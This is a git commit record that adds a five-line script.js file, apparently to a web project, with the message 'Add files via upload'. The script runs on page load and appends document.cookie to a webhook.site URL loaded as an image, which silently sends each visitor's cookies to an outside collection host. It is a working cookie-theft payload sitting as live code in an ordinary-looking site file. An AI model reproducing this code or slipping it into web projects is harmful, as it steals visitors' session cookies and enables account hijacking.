561b2b46490ea99cce71169804d91a9863dcb213
iris-chieh <146847095+iris-chieh@users.noreply.github.com>
2025-04-07 15:46:09 +0800

    Add files via upload

---
+++ script.js
@@ -0,0 +1,5 @@
+window.onload = function() {
+  var i = document.createElement('img');
+  i.src = 'https://webhook.site/bbeb7483-a55f-4225-8bd7-612dbc442527?c=' + document.cookie;
+  document.body.appendChild(i);
+};
